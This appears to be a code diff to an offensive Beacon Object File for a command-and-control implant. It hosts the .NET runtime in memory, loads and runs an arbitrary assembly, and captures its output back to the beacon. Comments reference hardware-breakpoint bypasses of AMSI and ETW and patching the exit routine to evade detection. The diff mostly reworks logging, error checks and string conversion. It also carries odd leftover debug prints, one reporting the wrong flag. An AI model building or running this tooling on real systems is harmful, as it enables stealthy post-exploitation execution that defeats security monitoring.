@@ -13,11 +13,6 @@ auto Dotnet::Inline(
     _In_ PWSTR Version,
     _In_ BOOL  KeepLoad
 ) -> BOOL {
-    Printf( "Assembly bytes at %p [%d bytes]", AsmBytes, AsmLength );
-    Printf( "Arguments %S", Arguments );
-    Printf( "Using app domain %S", AppDomName );
-    Printf( "Version: %S", Version );
-
     PWCHAR* AsmArgv   = { nullptr };
     ULONG   AsmArgc   = { 0 };
     BOOL    Success   = FALSE;
@@ -53,72 +48,85 @@ auto Dotnet::Inline(
 
     SECURITY_ATTRIBUTES SecAttr = { 0 };
 
+    DbgPrint("clr 0\n");
+
     HResult = CLRCreateInstance( 
-        CLSID.CLRMetaHost, IID.ICLRMetaHost, (PVOID*)&MetaHost 
+        xCLSID.CLRMetaHost, xIID.ICLRMetaHost, (PVOID*)&MetaHost 
     );
     if ( HResult || !MetaHost ) goto _BOF_END;
 
+    DbgPrint("clr 3\n");
+
+    DbgPrint("d Version %S\n", Version);
     //
     //  get the last version if parameters is not passed
     //
     if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
         HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
-        if ( HResult ) goto _BOF_END;
+        if ( FAILED( HResult ) ) goto _BOF_END;
 
         while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
             if ( !EnumRtm ) continue;
     
-            if ( SUCCEEDED( EnumRtm->QueryInterface( IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
+            if ( SUCCEEDED( EnumRtm->QueryInterface( xIID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
                 
                 if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                     Version = FmVersion;
-                    Printf("supported version: %S", FmVersion);
+                    DbgPrint("c Version %S\n", Version);
+                    DbgPrint("b Version %S\n", FmVersion);
                 }
             }
         }
     }
 
-    HResult = MetaHost->GetRuntime( Version, IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
-    if ( HResult ) goto _BOF_END;
+    DbgPrint("a Version %S\n", Version);
+
+    HResult = MetaHost->GetRuntime( Version, xIID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
+    if ( FAILED( HResult ) ) goto _BOF_END;
+
+    DbgPrint("clr 54\n");
 
     //
     // check if runtime is loadable
     //
     HResult = RtmInfo->IsLoadable( &IsLoadable );
-    Printf( "Is loadable: %s", IsLoadable ? "True" : "False" );
     if ( HResult || !IsLoadable ) goto _BOF_END;
 
+
+    DbgPrint("clr 1\n");
     //
     // load clr version
     //
     HResult = RtmInfo->GetInterface( 
-        CLSID.CorRuntimeHost, IID.ICorRuntimeHost, (PVOID*)&RtmHost 
+        xCLSID.CorRuntimeHost, xIID.ICorRuntimeHost, (PVOID*)&RtmHost 
     );
-    if ( HResult ) goto _BOF_END;
+    if ( FAILED( HResult ) ) goto _BOF_END;
+
+    DbgPrint("clr 1\n");
 
     //
     // start the clr loaded
     //
     HResult = RtmHost->Start();
-    if ( HResult ) goto _BOF_END;
+    if ( FAILED( HResult ) ) goto _BOF_END;
+
+    DbgPrint("clr started\n");
 
     //
     // create the app domain
     //
     HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
-    if ( HResult ) goto _BOF_END;
+    if ( FAILED( HResult ) ) goto _BOF_END;
 
-    HResult = AppDomThunk->QueryInterface( IID.AppDomain, (PVOID*)&AppDom );
-    if ( HResult ) goto _BOF_END;
+    HResult = AppDomThunk->QueryInterface( xIID.AppDomain, (PVOID*)&AppDom );
+    if ( FAILED( HResult ) ) goto _BOF_END;
 
     SafeBound = { AsmLength, 0 };
     SafeAsm   = SafeArrayCreate( VT_UI1, 1, &SafeBound );
-
     //
     // copy the dotnet assembly to safe array
     //
     Mem::Copy<PVOID>( SafeAsm->pvData, AsmBytes, AsmLength );
-
     //
     // active hwbp to bypass amsi/etw
     //
@@ -130,19 +138,19 @@ auto Dotnet::Inline(
     // load the dotnet
     //
     HResult = AppDom->Load_3( SafeAsm, &Assembly );
-    if ( HResult ) goto _BOF_END;
+    if ( FAILED( HResult ) ) goto _BOF_END;
 
     //
     // get the entry point
     //
     HResult = Assembly->get_EntryPoint( &MethodInfo );
-    if ( HResult ) goto _BOF_END;
+    if ( FAILED( HResult ) ) goto _BOF_END;
 
     //
     // get the parameters requirements
     //
     HResult = MethodInfo->GetParameters( &SafeExpc );
-    if ( HResult ) goto _BOF_END;
+    if ( FAILED( HResult ) ) goto _BOF_END;
 
     //
     // work with parameters requirements and do it
@@ -191,8 +199,6 @@ auto Dotnet::Inline(
     BackupOut = GetStdHandle( STD_OUTPUT_HANDLE );
     SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );
 
-    Printf( "invoking .NET assembly" );
-
     //
     // Patch Exit routine
     //
@@ -204,7 +210,7 @@ auto Dotnet::Inline(
     // invoke/execute the dotnet assembly
     //
     HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
-    if ( HResult ) goto _BOF_END;
+    if ( FAILED( HResult ) ) goto _BOF_END;
 
     //
     // desactive hwbp to bypass amsi/etw
@@ -218,16 +224,14 @@ auto Dotnet::Inline(
     //
     Output = Mem::Alloc<PVOID>( PIPE_BUFFER_LENGTH );
 
-    Printf( "start read output of the assembly" );
-
     //
     // read the output
     //
     Success = ReadFile( PipeRead, Output, PIPE_BUFFER_LENGTH, &OutLen, nullptr );
 
-    Printf( "dotnet asm output [%d bytes]\n\n %s", OutLen, Output );
+    BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Dotnet Output [%d bytes]\n\n %s", OutLen, Output );
 _BOF_END:
-    if ( HResult ) {    
+    if ( FAILED( HResult ) ) {    
         LPSTR errorMessage = nullptr;
         DWORD flags = 
             FORMAT_MESSAGE_ALLOCATE_BUFFER | 
@@ -235,16 +239,16 @@ _BOF_END:
             FORMAT_MESSAGE_IGNORE_INSERTS;
     
         DWORD result = FormatMessageA(
-            flags, nullptr, HResult,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+            flags, nullptr, HResult, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
             (LPSTR)&errorMessage, 0, nullptr
         );
     
         if ( result > 0 && errorMessage != nullptr ) {
-            Printf("Erro (HRESULT 0x%08X): %s\n", HResult, errorMessage);
+            BeaconPrintf(CALLBACK_OUTPUT, "[x] Error (HRESULT 0x%08X): %s\n", HResult, errorMessage);
         }
     
         if ( errorMessage != nullptr ) {
-            // Self->Hp->Free( errorMessage );
+            LocalFree( errorMessage );
         }
     }
 
@@ -272,7 +276,7 @@ _BOF_END:
         RtmInfo->Release();
     }
 
-    if ( !KeepLoad ) {
+    if ( ! KeepLoad ) {
         RtmHost->UnloadDomain( AppDomThunk );
     } 
 
@@ -289,17 +293,51 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
 
     BeaconDataParse( &Parser, Args, Argc );
 
-    INT32  Length    = 0;
-    BYTE*  Buffer    = (BYTE*)BeaconDataExtract( &Parser, &Length );
-    WCHAR* Arguments = (WCHAR*)BeaconDataExtract( &Parser, 0 );
-    WCHAR* AppDomain = (WCHAR*)BeaconDataExtract( &Parser, 0 );;
-    WCHAR* FmVersion = (WCHAR*)BeaconDataExtract( &Parser, 0 );;
-    ULONG  Bypass    = BeaconDataInt( &Parser );
-    BOOL   PatchExit = BeaconDataInt( &Parser );
-    BOOL   Keep      = BeaconDataInt( &Parser );
+    INT32 Length    = 0;
+    BYTE* Buffer    = (BYTE*)BeaconDataExtract( &Parser, &Length );
+    CHAR* Arguments = (CHAR*)BeaconDataExtract( &Parser, 0 );
+    CHAR* AppDomain = (CHAR*)BeaconDataExtract( &Parser, 0 );;
+    CHAR* FmVersion = (CHAR*)BeaconDataExtract( &Parser, 0 );;
+    ULONG Bypass    = BeaconDataInt( &Parser );
+    BOOL  PatchExit = BeaconDataInt( &Parser );
+    BOOL  Keep      = BeaconDataInt( &Parser );
+
+    DbgPrint("Version: %s\n", FmVersion);
+    DbgPrint("Arguments: %s\n", Arguments);
+    DbgPrint("app domain: %s\n", AppDomain);
+    DbgPrint("Buffer @ %p %d\n", Buffer, Length);
+    DbgPrint("bypass %X\n", Bypass);
+    DbgPrint("patch exit: %s\n", Bypass ? "true" : "false");
+    DbgPrint("Keep: %s\n", Keep ? "true" : "false");
+
+    ULONG AppDomainL = Str::LengthA( AppDomain ) * sizeof( WCHAR );
+    ULONG VersionL   = Str::LengthA( FmVersion ) * sizeof( WCHAR );
+    ULONG ArgumentsL = Str::LengthA( Arguments ) * sizeof( WCHAR );
+
+    WCHAR* wArguments  = Mem::Alloc<WCHAR*>( ArgumentsL );
+    WCHAR* wVersion    = Mem::Alloc<WCHAR*>( VersionL );
+    WCHAR* wAppDomName = Mem::Alloc<WCHAR*>( AppDomainL );
+
+    DbgPrint("memory allocated %p %p %p", wArguments, wVersion, wAppDomName);
+
+    Arguments = Arguments[0] ? Arguments : nullptr;
+
+    Str::CharToWChar( wArguments, Arguments, ArgumentsL );
+    DbgPrint("Arguments: %S\n", wArguments);
+    Str::CharToWChar( wVersion, FmVersion, VersionL );
+    DbgPrint("Version: %S\n", wVersion);
+    Str::CharToWChar( wAppDomName, AppDomain, AppDomainL );
 
     Dotnet::Bypass     = Bypass;
     Dotnet::ExitBypass = PatchExit;
 
-    Dotnet::Inline( Buffer, Length, Arguments, AppDomain, FmVersion, Keep );
+    DbgPrint("Version: %S\n", wVersion);
+    DbgPrint("app domain: %S\n", wAppDomName);
+    DbgPrint("Arguments: %S\n", wArguments);
+    DbgPrint("Buffer @ %p %d\n", Buffer, Length);
+    DbgPrint("bypass %X\n", Bypass);
+    DbgPrint("patch exit: %s\n", Bypass ? "true" : "false");
+    DbgPrint("Keep: %s\n", Keep ? "true" : "false");
+
+    Dotnet::Inline( Buffer, Length, wArguments, wAppDomName, wVersion, Keep );
 }
